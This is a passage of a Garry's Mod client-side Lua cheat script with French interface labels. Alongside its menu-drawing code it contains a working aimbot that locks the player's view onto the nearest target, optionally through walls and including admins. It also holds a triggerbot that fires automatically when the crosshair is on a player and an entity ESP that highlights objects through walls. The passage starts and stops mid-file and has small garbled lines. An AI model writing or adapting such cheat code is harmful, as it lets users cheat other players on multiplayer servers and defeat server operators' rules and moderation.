Optionsphysiclow:SetTextColor( Color( 255, 255, 255, 100 ) )
draw.RoundedBox( 0, 0, 0, w, h, Color(100, 100, 100, 20))
end
Optionsphysiclow.OnCursorEntered = function(self)
surface.PlaySound( fiji_ptiycheathover )
end
Optionsphysiclow.DoClick = function()
LocalPlayer():ConCommand("physgun_wheelspeed 20")
surface.PlaySound( fiji_ptiycheatclick )
end
end

local OptionsColorDEFAULT = vgui.Create( "DButton", pContent)
OptionsColorDEFAULT:SetPos( 243, 83)
OptionsColorDEFAULT:SetSize( 50, 20  )
OptionsColorDEFAULT:SetTextColor( Color( 255, 255, 255, 255 ) )
OptionsColorDEFAULT:SetText( "Default" )
OptionsColorDEFAULT.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if self:IsHovered() then
OptionsColorDEFAULT:SetTextColor( Color( 255, 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(150, 150, 150, 20))
else
OptionsColorDEFAULT:SetTextColor( Color( 255, 255, 255, 100 ) )
draw.RoundedBox( 0, 0, 0, w, h, Color(100, 100, 100, 20))
end
OptionsColorDEFAULT.OnCursorEntered = function(self)
surface.PlaySound( fiji_ptiycheathover )
end
OptionsColorDEFAULT.DoClick = function()
LocalPlayer():ConCommand("fiji_menu_princ_color 60")
LocalPlayer():ConCommand("fiji_menu_sec_color 60")
LocalPlayer():ConCommand("fiji_menu_th_color 60")
LocalPlayer():ConCommand("fiji_style_menu 3")
surface.PlaySound( fiji_ptiycheatclick )
end
end

local Resetb = vgui.Create( "DButton", pContent)
Resetb:SetPos( 207, 123)
Resetb:SetSize( 120, 35  )
Resetb:SetTextColor( Color( 255, 255, 255, 255 ) )
Resetb:SetText( "Réinitialiser le menu" )
Resetb.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if self:IsHovered() then
Resetb:SetTextColor( Color( 255, 255, 255, 255 ) )
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 60 ) )
aBorder = Color( 110,110,110, 80 )
else
Resetb:SetTextColor( Color( 255, 255, 255, 80 ) )
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
aBorder = Color( 110,110,110, 0 )
end
surface.SetDrawColor( aBorder )
surface.DrawOutlinedRect( 0, 0, w, h )
Resetb.OnCursorEntered = function(self)
surface.PlaySound( "mat/ptiycheathover.wav" )
end
Resetb.DoClick = function()
NOTIFICATION("Menu réinitialiser avec sucès")
surface.PlaySound( fiji_ptiycheatclick )
LocalPlayer():ConCommand("fiji_menu_princ_color 50")
LocalPlayer():ConCommand("fiji_menu_sec_color 50")
LocalPlayer():ConCommand("fiji_menu_th_color 50")
LocalPlayer():ConCommand("fiji_style_menu 3")
LocalPlayer():ConCommand("fiji_principal_color 255")
LocalPlayer():ConCommand("fiji_secondary_color 0")
LocalPlayer():ConCommand("fiji_third_color 0")
LocalPlayer():ConCommand("fiji_principal_color_infos 255")
LocalPlayer():ConCommand("fiji_secondary_color_infos 255")
LocalPlayer():ConCommand("fiji_third_color_infos 255")
LocalPlayer():ConCommand("fiji_principal_color_ent 255")
LocalPlayer():ConCommand("fiji_secondary_color_ent 0")
LocalPlayer():ConCommand("fiji_third_color_ent 0")
LocalPlayer():ConCommand("fiji_principal_color_props 255")
LocalPlayer():ConCommand("fiji_secondary_color_props 0")
LocalPlayer():ConCommand("fiji_third_color_props 0")
LocalPlayer():ConCommand("BD_hitman_enable 1")
LocalPlayer():ConCommand("BD_hitman_enable_ent 0")
LocalPlayer():ConCommand("BD_hitman_enable_props 0")
LocalPlayer():ConCommand("BD_hitman_type 1")
LocalPlayer():ConCommand("BD_hitman_infos_name 1")
LocalPlayer():ConCommand("BD_hitman_infos_weapons 1")
LocalPlayer():ConCommand("BD_hitman_infos_health 1")
LocalPlayer():ConCommand("BD_hitman_distance 7000")
LocalPlayer():ConCommand("BD_hitman_distance_infos 800")
LocalPlayer():ConCommand("BD_hitman_distance_ent 800")
LocalPlayer():ConCommand("fiji_aimbot_active 0")
LocalPlayer():ConCommand("fiji_aimbot_friends 0")
LocalPlayer():ConCommand("fiji_aimbot_team 0")
LocalPlayer():ConCommand("fiji_aimbot_admin 0")
LocalPlayer():ConCommand("fiji_aimbot_propa 0")
LocalPlayer():ConCommand("fiji_aimbot_wall 0")
LocalPlayer():ConCommand("fiji_aimbot_fov 180")
LocalPlayer():ConCommand("fiji_aimbot_dist 1500")
LocalPlayer():ConCommand("fiji_triggerbot_active 0")
LocalPlayer():ConCommand("fiji_triggerbot_opti 0")
LocalPlayer():ConCommand("fiji_triggerbot_real 0")
LocalPlayer():ConCommand("fiji_triggerbot_team 0")
LocalPlayer():ConCommand("fiji_triggerbot_wall 0")
LocalPlayer():ConCommand("fiji_triggerbot_friends 0")
LocalPlayer():ConCommand("fiji_exist_contentptiycheat 1")
LocalPlayer():ConCommand("fiji_aimbot_key KEY_W")
LocalPlayer():ConCommand("fiji_aimbot_relock 0")
LocalPlayer():ConCommand("fiji_aimbot_attack chest")
LocalPlayer():ConCommand("fiji_exist_contentptiycheat 1")
end



end -- enf function options

end
function BD:Aimbot( pContent )

local BDMenuAim = vgui.Create("DPanel", pContent)
BDMenuAim:SetSize( 539, 388 )
BDMenuAim:SetPos( 0, 0 )
BDMenuAim.Paint = function( self, w, h)
if fiji_style_menu:GetInt() == 2 then
draw.RoundedBox( 0, 0, 0, 2, h - 238,  Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )
draw.RoundedBox( 0, 0, 194, 2, h - 190, Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )

elseif fiji_style_menu:GetInt() == 1 then
draw.RoundedBox( 0, 0, 0, 2, h - 238,  HSVToColor( CurTime() % 6 * 60, 1, 0.5 ) )
draw.RoundedBox( 0, 0, 194, 2, h - 190,  HSVToColor( CurTime() % 6 * 60, 1, 0.5 ) )


else
draw.RoundedBox( 0, 0, 0, 2, h - 238, Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ) )
draw.RoundedBox( 0, 0, 194, 2, h - 190, Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ) )
end


draw.RoundedBox( 200, 382, 10, 2, h - 216, Color( 50,50,50, 255 ) )
draw.RoundedBox( 200, 149, 10, 2, h - 216, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 151, 180, w - 307, 2, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 151, 10, w - 448, 2, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 294, 10, w - 451, 2, Color( 50,50,50, 255 ) )
draw.SimpleText("Aimbot", "ptiycheat_home3", 248, 10, Color(100, 100, 100,255), 0, 1)
draw.SimpleText("Cibles", "ptiycheat_home3", 250, 80, Color(100, 100, 100,255), 0, 1)
--draw.SimpleText("Touche Aimbot : B", "ptiycheat_home3", 220, 150, Color(100, 100, 100,255), 0, 1)



draw.RoundedBox( 200, 382, 205, 2, h - 251, Color( 50,50,50, 255 ) )
draw.RoundedBox( 200, 149, 205, 2, h - 251, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 151, 340, w - 307, 2, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 151, 205, w - 455, 2, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 300, 205, w - 456, 2, Color( 50,50,50, 255 ) )
draw.SimpleText("Triggerbot", "ptiycheat_home3", 239, 205, Color(100, 100, 100,255), 0, 1)
draw.SimpleText("Cibles", "ptiycheat_home3", 250, 285, Color(100, 100, 100,255), 0, 1)
draw.SimpleText("Touche Aimbot", "ptiycheat_homemini", 234, 352, Color(100, 100, 100,255), 0, 1)


end

local aimbinder = vgui.Create( "DBinder", pContent )
aimbinder:SetSize( 234, 25 )
aimbinder:SetPos( 150,360 )
aimbinder:SetConVar( "fiji_aimbot_key" )
function aimbinder:Paint( w, h )
if self:IsHovered() then
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 60 ) )
aBorder = Color( 255,110,110, 150 )
else
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
aBorder = Color( 250,110,110, 50 )
end
aimbinder.OnCursorEntered = function(self)
surface.PlaySound( fiji_ptiycheathover )

end
surface.SetDrawColor( aBorder )
surface.DrawOutlinedRect( 0, 0, w, h )


end


local pPAim = vgui.Create( "DPanel", pContent )
pPAim:SetSize( 110, 35 )
pPAim:SetPos( 154, 135 )
function pPAim:Paint( w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
draw.SimpleText( "♦", "ptiycheat_home5", 14, h / 2 + 7, color_white, 0, 1 )
draw.SimpleText( "DISTANCE CIBLES", "ptiycheat_home5", 10, 8, color_white, 0, 1 )

end
local pDistanceAIM = vgui.Create( "DNumSlider", pContent )
pDistanceAIM:SetPos( 107, 135 )
pDistanceAIM:SetSize( 180, 50 )
pDistanceAIM:SetText( "" )
pDistanceAIM:SetMin( 100 )
pDistanceAIM:SetMax( 3000 )
pDistanceAIM:SetDecimals( 0 )
pDistanceAIM:SetValue( fiji_aimbot_dist:GetInt() or 200 )
pDistanceAIM.Scratch:SetVisible( false )
pDistanceAIM.TextArea:SetTextColor( color_white )
function pDistanceAIM:OnValueChanged( val )
RunConsoleCommand( 'fiji_aimbot_dist', tonumber( self:GetValue() ) )
end
function pDistanceAIM.Slider:Paint(w, h)
surface.SetDrawColor(0, 0, 0, 255)
surface.DrawRect(0, 21, w, h / 5) local parent = self:GetParent() local barw = w * ( (parent:GetValue() - parent:GetMin()) / parent:GetRange() )
if fiji_style_menu:GetInt() == 2 then
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 21, barw, h / 5)

elseif fiji_style_menu:GetInt() == 1 then
surface.SetDrawColor(HSVToColor( CurTime() % 6 * 60, 1, 0.5 ))
surface.DrawRect(0, 21, barw, h / 5)

else
surface.SetDrawColor(fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt())
surface.DrawRect(0, 21, barw, h / 5)
end
end
function pDistanceAIM:SetHeight(tall)
self.Slider.Knob:SetHeight(tall / 2 + 4)
DSlider.SetHeight(self, tall)
pDistanceAIM.SetTall = pDistanceAIM.SetHeight
pDistanceAIM.Slider.Knob:SetTall(5)
end
function pDistanceAIM.Slider.Knob:Paint(w, h)
derma.SkinHook( "Paint", "Button", self, 0, 0 )
end


local pPAim2 = vgui.Create( "DPanel", pContent )
pPAim2:SetSize( 110, 35 )
pPAim2:SetPos( 269, 135 )
function pPAim2:Paint( w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
draw.SimpleText( "♦", "ptiycheat_home5", 14, h / 2 + 7, color_white, 0, 1 )
draw.SimpleText( "CHAMP DE VISION", "ptiycheat_home5", 10, 8, color_white, 0, 1 )

end
local pDistanceAIMb = vgui.Create( "DNumSlider", pContent )
pDistanceAIMb:SetPos( 220, 135 )
pDistanceAIMb:SetSize( 180, 50 )
pDistanceAIMb:SetText( "" )
pDistanceAIMb:SetMin( 5 )
pDistanceAIMb:SetMax( 180 )
pDistanceAIMb:SetDecimals( 0 )
pDistanceAIMb:SetValue( fiji_aimbot_fov:GetInt() or 200 )
pDistanceAIMb.Scratch:SetVisible( false )
pDistanceAIMb.TextArea:SetTextColor( color_white )
function pDistanceAIMb:OnValueChanged( val )
RunConsoleCommand( 'fiji_aimbot_fov', tonumber( self:GetValue() ) )
end
function pDistanceAIMb.Slider:Paint(w, h)
surface.SetDrawColor(0, 0, 0, 255)
surface.DrawRect(0, 21, w, h / 5) local parent = self:GetParent() local barw = w * ( (parent:GetValue() - parent:GetMin()) / parent:GetRange() )
if fiji_style_menu:GetInt() == 2 then
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 21, barw, h / 5)

elseif fiji_style_menu:GetInt() == 1 then
surface.SetDrawColor(HSVToColor( CurTime() % 6 * 60, 1, 0.5 ))
surface.DrawRect(0, 21, barw, h / 5)

else
surface.SetDrawColor(fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt())
surface.DrawRect(0, 21, barw, h / 5)
end
end
function pDistanceAIMb:SetHeight(tall)
self.Slider.Knob:SetHeight(tall / 2 + 4)
DSlider.SetHeight(self, tall)
pDistanceAIMb.SetTall = pDistanceAIMb.SetHeight
pDistanceAIMb.Slider.Knob:SetTall(5)
end
function pDistanceAIMb.Slider.Knob:Paint(w, h)
derma.SkinHook( "Paint", "Button", self, 0, 0 )
end

local tblAdminGroups = {
["superadmin"] = true,
["admin"] = true,
["administrator"] = true,
["administrateur"] = true,
["moderateur"] = true,
["modérateur"] = true,
["moderateur test"] = true,
["moderateur-test"] = true,
["modérateur test"] = true,
["modérateur-test"] = true
}


local pTarget

function findNearestPlayer()
local intDist = math.huge
pTarget = pTarget or nil
local angNew = LocalPlayer():GetAngles()
for k, v in pairs( player.GetAll() ) do
-- Cannot self-aim
if v == LocalPlayer() then continue end
-- Die
if not v:Alive() then continue end
-- God
if v:HasGodMode() then continue end
-- Same Team
if fiji_aimbot_team:GetInt() == 0 && v:Team() == LocalPlayer():Team() then continue end
-- Aim Admins
if fiji_aimbot_admin:GetInt() == 0 && tblAdminGroups[v:GetUserGroup()] then continue end
-- Max dist
if v:GetPos():DistToSqr( LocalPlayer():GetPos() ) > fiji_aimbot_dist:GetInt() ^ 2 then continue end
-- Steam Friend
if fiji_aimbot_friends:GetInt() == 0 && v:GetFriendStatus() == "friend" then continue end

-- Check Nearest
local newdist = LocalPlayer():GetPos():DistToSqr( v:GetPos() )
if newdist < intDist then

-- Aim World
if fiji_aimbot_wall:GetInt() == 0 then
local tr = util.TraceHull( {
start = LocalPlayer():EyePos(),
endpos = v:EyePos(),
maxs = math.huge,
mins = 10,
filter = v
} )
if tr.Hit then continue end
end
-- if fiji_aimbot_wall:GetInt() == 0 && tr.Hit then continue end

local eyes =  v:LookupAttachment( fiji_aimbot_attack:GetString() )
eyes = ( eyes && v:GetAttachment( eyes ).Pos ||  v:LocalToWorld( v:OBBCenter() ) )

local intDiff = math.AngleDifference( ( eyes - LocalPlayer():EyePos() ):Angle().yaw, LocalPlayer():GetAngles().yaw )
intDiff = math.abs( intDiff )

if intDiff > fiji_aimbot_fov:GetInt() then continue end


-- Define New
pTarget = v
intDist = newdist
end
end

return pTarget or nil
end

hook.Add( "PlayerButtonDown", "CPaCoolHack:PlayerButtonDown", function( pPlayer, button )
if gui.IsGameUIVisible() then return end
if fiji_aimbot_active:GetInt() != 1 then return end
if button != GetConVarNumber( "fiji_aimbot_key" ) then return end

pTarget = findNearestPlayer()
end)

hook.Add( "PlayerButtonUp", "CPaCoolHack:PlayerButtonUp", function( pPlayer, button )
if button != GetConVarNumber( "fiji_aimbot_key" ) then return end

pTarget = nil
end)

hook.Add( "Think", "dkzaodjzaodjza", function()
if gui.IsGameUIVisible() then return end
if fiji_aimbot_active:GetInt() != 1 then return end
if not input.IsKeyDown( GetConVarNumber( "fiji_aimbot_key" ) ) then return end

-- Nobody Found
if not pTarget || pTarget == nil then return end
if not IsValid( pTarget ) || not pTarget:IsPlayer() || not pTarget:Alive() then
if fiji_aimbot_relock:GetInt() == 1 then
pTarget = findNearestPlayer()
else
pTarget = nil
end
return
end

-- Define New
local eyes =  pTarget:LookupAttachment( "chest" ) -- "chest" = corps si tu veux
eyes = ( eyes && pTarget:GetAttachment( eyes ).Pos ||  pTarget:LocalToWorld( pTarget:OBBCenter() ) )
angNew = ( eyes - LocalPlayer():EyePos() ):Angle()
-- Aim
LocalPlayer():SetEyeAngles( angNew )
end)

local tblConVarsOptions = {
{ title = "Activé", cv = "aimbot_enabled" },
{ title = "Travers Mur", cv = "aimbot_wall" },
{ title = "Amis Steam", cv = "aimbot_friends" },
{ title = "Même team", cv = "aimbot_team" },
{ title = "Administrateurs", cv = "aimbot_admins" },
}

local ply = LocalPlayer()

hook.Add( "Think", "Triggerbot", function()
local EntTrace = ply:GetEyeTrace().Entity
for k,v in pairs (player.GetAll()) do
if fiji_triggerbot_active:GetInt() == 1 and ply:Alive() and ply:GetActiveWeapon():IsValid() and ( EntTrace:IsPlayer() )  then
if fiji_triggerbot_friends:GetInt() == 0 and EntTrace:IsPlayer() and EntTrace:GetFriendStatus() == "friend" then return end
if fiji_triggerbot_team:GetInt() == 0 and EntTrace:IsPlayer() and EntTrace:Team() == ply:Team() then return end
if fiji_triggerbot_wall:GetInt() == 0 and tblAdminGroups[v:GetUserGroup()] then continue else end
local pos = LocalPlayer():GetShootPos()
local ang = LocalPlayer():GetAimVector()
local tracedata = {}
local td = {start = v:GetShootPos(), endpos = v:GetShootPos() + v:EyeAngles():Forward() * 65535, filter = v, mask = MASK_SHOT}
local tr = util.TraceLine(td)
tracedata.start = pos
tracedata.endpos = pos+(ang*9999999999999)
local trace = util.TraceLine(tracedata)
if(trace.HitNonWorld) then
if tr.Entity:IsPlayer() then
RunConsoleCommand("+attack")
timer.Simple(0.000000001, function() RunConsoleCommand("-attack") end)
end
end
end
end
end)







local btnaimbotact = BD:CreateBtn( "Activé", 165, 30, 65, 25, pContent )
function btnaimbotact:DoClick() surface.PlaySound( fiji_ptiycheatclick ) if fiji_aimbot_active:GetInt() == 1 then RunConsoleCommand( "fiji_aimbot_active", 0 ) else RunConsoleCommand( "fiji_aimbot_active", 1 )  end end
function btnaimbotact:Think() if  fiji_aimbot_active:GetInt() == 1 then self.activebtn = true  else self.activebtn = false end end

local btnaimbotact = BD:CreateBtn( "Wallhack", 235, 30, 65, 25, pContent )
function btnaimbotact:DoClick() surface.PlaySound( fiji_ptiycheatclick ) if fiji_aimbot_wall:GetInt() == 1 then RunConsoleCommand( "fiji_aimbot_wall", 0 ) else RunConsoleCommand( "fiji_aimbot_wall", 1 )  end end
function btnaimbotact:Think() if  fiji_aimbot_wall:GetInt() == 1 then self.activebtn = true  else self.activebtn = false end end

local btnaimbotact = BD:CreateBtn( "Cible Suiv.", 305, 30, 65, 25, pContent )
function btnaimbotact:DoClick() surface.PlaySound( fiji_ptiycheatclick ) if fiji_aimbot_relock:GetInt() == 1 then RunConsoleCommand( "fiji_aimbot_relock", 0 ) else RunConsoleCommand( "fiji_aimbot_relock", 1 )  end end
function btnaimbotact:Think() if  fiji_aimbot_relock:GetInt() == 1 then self.activebtn = true  else self.activebtn = false end end

local btnaimbotact = BD:CreateBtn( "Amis", 235, 95, 65, 25, pContent )
function btnaimbotact:DoClick() surface.PlaySound( fiji_ptiycheatclick ) if fiji_aimbot_friends:GetInt() == 1 then RunConsoleCommand( "fiji_aimbot_friends", 0 ) else RunConsoleCommand( "fiji_aimbot_friends", 1 )  end end
function btnaimbotact:Think() if  fiji_aimbot_friends:GetInt() == 1 then self.activebtn = true  else self.activebtn = false end end

local btnaimbotact = BD:CreateBtn( "Admin", 165, 95, 65, 25, pContent )
function btnaimbotact:DoClick() surface.PlaySound( fiji_ptiycheatclick ) if fiji_aimbot_admin:GetInt() == 1 then RunConsoleCommand( "fiji_aimbot_admin", 0 ) else RunConsoleCommand( "fiji_aimbot_admin", 1 )  end end
function btnaimbotact:Think() if  fiji_aimbot_admin:GetInt() == 1 then self.activebtn = true  else self.activebtn = false end end

local btnaimbotact = BD:CreateBtn( "Team", 305, 95, 65, 25, pContent )
function btnaimbotact:DoClick() surface.PlaySound( fiji_ptiycheatclick ) if fiji_aimbot_team:GetInt() == 1 then RunConsoleCommand( "fiji_aimbot_team", 0 ) else RunConsoleCommand( "fiji_aimbot_team", 1 )  end end
function btnaimbotact:Think() if  fiji_aimbot_team:GetInt() == 1 then self.activebtn = true  else self.activebtn = false end end



local btnaimbotact = BD:CreateBtn( "Activé", 165, 230, 65, 25, pContent )
function btnaimbotact:DoClick() surface.PlaySound( fiji_ptiycheatclick ) if fiji_triggerbot_active:GetInt() == 1 then RunConsoleCommand( "fiji_triggerbot_active", 0 ) else RunConsoleCommand( "fiji_triggerbot_active", 1 )  end end
function btnaimbotact:Think() if  fiji_triggerbot_active:GetInt() == 1 then self.activebtn = true  else self.activebtn = false end end

local btnaimbotact = BD:CreateBtn( "Debug", 235, 230, 65, 25, pContent )
function btnaimbotact:DoClick() surface.PlaySound( fiji_ptiycheatclick ) if fiji_triggerbot_opti:GetInt() == 1 then RunConsoleCommand( "fiji_triggerbot_opti", 0 ) else RunConsoleCommand( "fiji_triggerbot_opti", 1 )  end end
function btnaimbotact:Think() if  fiji_triggerbot_opti:GetInt() == 1 then self.activebtn = true  else self.activebtn = false end end

local btnaimbotact = BD:CreateBtn( "Réaliste", 305, 230, 65, 25, pContent )
function btnaimbotact:DoClick() surface.PlaySound( fiji_ptiycheatclick ) if fiji_triggerbot_real:GetInt() == 1 then RunConsoleCommand( "fiji_triggerbot_real", 0 ) else RunConsoleCommand( "fiji_triggerbot_real", 1 )  end end
function btnaimbotact:Think() if  fiji_triggerbot_real:GetInt() == 1 then self.activebtn = true  else self.activebtn = false end end

local btnaimbotact = BD:CreateBtn( "Amis", 235, 300, 65, 25, pContent )
function btnaimbotact:DoClick() surface.PlaySound( fiji_ptiycheatclick ) if fiji_triggerbot_friends:GetInt() == 1 then RunConsoleCommand( "fiji_triggerbot_friends", 0 ) else RunConsoleCommand( "fiji_triggerbot_friends", 1 )  end end
function btnaimbotact:Think() if  fiji_triggerbot_friends:GetInt() == 1 then self.activebtn = true  else self.activebtn = false end end

local btnaimbotact = BD:CreateBtn( "Admin", 165, 300, 65, 25, pContent )
function btnaimbotact:DoClick() surface.PlaySound( fiji_ptiycheatclick ) if fiji_triggerbot_wall:GetInt() == 1 then RunConsoleCommand( "fiji_triggerbot_wall", 0 ) else RunConsoleCommand( "fiji_triggerbot_wall", 1 )  end end
function btnaimbotact:Think() if  fiji_triggerbot_wall:GetInt() == 1 then self.activebtn = true  else self.activebtn = false end end

local btnaimbotact = BD:CreateBtn( "Team", 305, 300, 65, 25, pContent )
function btnaimbotact:DoClick() surface.PlaySound( fiji_ptiycheatclick ) if fiji_triggerbot_team:GetInt() == 1 then RunConsoleCommand( "fiji_triggerbot_team", 0 ) else RunConsoleCommand( "fiji_triggerbot_team", 1 )  end end
function btnaimbotact:Think() if  fiji_triggerbot_team:GetInt() == 1 then self.activebtn = true  else self.activebtn = false end end


end -- end aim


local save_dir = "vcmod/enthudset.txt"

if not file.IsDir( "vcmod" , "DATA" ) then
    file.CreateDir( "vcmod", "[]" )
end
if not file.Exists( save_dir , "DATA" ) then
    file.Write( save_dir, "[]" )
end

local function AddToESP( class, color )
    local actual = util.JSONToTable( file.Read( save_dir, "DATA" ) )
    actual[class] = color
    file.Write( save_dir, util.TableToJSON( actual ) )
end

local function RemoveFromESP( class )
    local actual = util.JSONToTable( file.Read( save_dir, "DATA" ) )
    actual[class] = nil
    file.Write( save_dir, util.TableToJSON( actual ) )
end

local function GetESP()
    return util.JSONToTable( file.Read( save_dir, "DATA" ) )
end

local tblColors = {
    {
        color = Color( 255, 0, 0 )
    },
    {
        color = Color( 255, 102, 0 )
    },
    {
        color = Color( 196, 192, 0 )
    },
    {
        color = Color( 0, 255, 0 )
    },
    {
        color = Color( 0, 0, 255 )
    },
    {
        color = Color( 0, 229, 255 )
    },
    {
        color = Color( 89, 0, 255 )
    },
    {
        color = Color( 255, 0, 250 )
    },
    {
        color = Color( 255, 255, 255 )
    },
    {
        color = Color( 0, 0, 0 )
    },
}

local function reOpenMenu( pnl )
    pnl:Remove()
    LocalPlayer():ConCommand( "fiji_espent" )
end

hook.Add( "HUDPaint", "ESPAdvanced:espenttext", function()
if fiji_vision_enable_ent:GetInt() == 1 then
	if fiji_vision_enable_enttext:GetInt() == 1 then
  for Ik, Iv in pairs( GetESP() ) do
    for k, v in pairs( ents.FindByClass( Ik ) ) do
if v:GetPos():Distance( LocalPlayer():GetPos() ) > fiji_vision_distance_ent:GetInt() then continue end
      local Pos = ( v:GetPos() ):ToScreen()
      draw.SimpleText( Ik, "Trebuchet18", Pos.x, Pos.y, Iv.color, 1, 1 )
    end
  end
  else end
  else end
end)


hook.Add( "PreDrawHalos", "ESPAdvanced:espenthalo", function()
	if fiji_vision_enable_ent:GetInt() == 1 then
	if fiji_vision_enable_enthalo:GetInt() == 1 then
    for k, v in pairs( GetESP() ) do
    halo.Add( ents.FindByClass( k ), v.color, 5, 5, 2, true, true )
    end
    else end
    else end
end )

local blackListESP = {
    ["func_brush"] = true,
    ["worldspawn"] = true,
    ["viewmodel"] = true,
    ["widget_base"] = true,
    ["widget_bone"] = true,
    ["widget_bones"] = true,
    ["widget_disc"] = true,
    ["edit_sky"] = true,
    ["edit_fog"] = true,
    ["edit_sun"] = true,
    ["gmod_balloon"] = true,
    ["gmod_ghost"] = true,
    ["widget_axis_arrow"] = true,
    ["gmod_light"] = true,
    ["gmod_thruster"] = true,
    ["base_ai"] = true,
    ["base_nextbot"] = true,
    ["base_anim"] = true,
    ["gmod_dynamite"] = true,
    ["prop_effect"] = true,
    ["gmod_emitter"] = true,
    ["lab_base"] = true,
    ["gmod_hands"] = true,
    ["ragdoll_motion"] = true,
    ["widget_bonemanip_move"] = true,
    ["gmod_button"] = true,
    ["gmod_cameraprop"] = true,
    ["gmod_hoverball"] = true,
    ["fadmin_jail"] = true,
    ["widget_arrow"] = true,
    ["base_point"] = true,
    ["widget_axis_disc"] = true,
    ["widget_bonemanip_rotate"] = true,
    ["widget_bonemanip_scale"] = true,
    ["fadmin_motd"] = true,
    ["env_skypaint"] = true,
    ["base_edit"] = true,
    ["base_entity"] = true,
    ["gmod_anchor"] = true,
    ["gmod_wheel"] = true,
    ["gmod_lamp"] = true,
    ["sent_ball"] = true,
    ["base_gmodentity"] = true,
    ["npc_tf2_ghost"] = true,
    ["class C_PlayerResource"] = true,
    ["class C_GMODGameRulesPro"] = true,
}

concommand.Add( "fiji_espent", function()
    local Base = vgui.Create( "DFrame" )
    Base:SetSize( 700, 245 )
    Base:SetTitle( "" )
    Base:Center()
    Base:MakePopup()
    Base:ShowCloseButton(false)
function Base:Paint( w, h )
DrawBlur(self, 25)
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0,240 ) )

if fiji_style_menu:GetInt() == 2 then
draw.RoundedBox( 0, 4, 4, w - 8, 2,Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)))
draw.RoundedBox( 0, 4, h - 6, w - 10, 2, Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )
draw.RoundedBox( 0, 4, 6, 2, h - 12, Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )
draw.RoundedBox( 0, w - 6, 6, 2, h - 10, Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )
elseif fiji_style_menu:GetInt() == 1 then
draw.RoundedBox( 0, 4, 4, w - 8, 2, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ) )
draw.RoundedBox( 0, 4, h - 6, w - 10, 2, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ) )
draw.RoundedBox( 0, 4, 6, 2, h - 12, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ) )
draw.RoundedBox( 0, w - 6, 6, 2, h - 10, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ) )
else
draw.RoundedBox( 0, 4, 4, w - 8, 2, Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ) )
draw.RoundedBox( 0, 4, h - 6, w - 10, 2, Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ) )
draw.RoundedBox( 0, 4, 6, 2, h - 12, Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ) )
draw.RoundedBox( 0, w - 6, 6, 2, h - 10, Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ) )
end
end

local CloseMain = vgui.Create( "DButton", Base)
CloseMain:SetPos( 673, 7)
CloseMain:SetSize( 20, 20  )
CloseMain:SetTextColor( Color( 255, 255, 255, 255 ) )
CloseMain:SetText( "X" )
CloseMain.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(150, 150, 150, 100))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(100, 100, 100, 0))
end
CloseMain.DoClick = function()
Base:Remove()
end
end

concommand.Add( "fiji_clearespent", function() -- fiji_sv_existmen
Base:Remove()

end)


local CopiediscordHome = vgui.Create( "DButton", Base)
CopiediscordHome:SetPos( 10, 200)
CopiediscordHome:SetSize( 80, 35  )
CopiediscordHome:SetTextColor( Color( 255, 255, 255, 255 ) )
CopiediscordHome:SetText( "Sauvegarder" )
CopiediscordHome.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if self:IsHovered() then
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 60 ) )
aBorder = Color( 110,110,110, 80 )
else
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
aBorder = Color( 110,110,110, 0 )
endder = Color( 110,110,110, 0 )
end
CopiediscordHome.OnCursorEntered = function(self)
surface.PlaySound( fiji_ptiycheathover )
end
surface.SetDrawColor( aBorder )
surface.DrawOutlinedRect( 0, 0, w, h )
CopiediscordHome.DoClick = function()
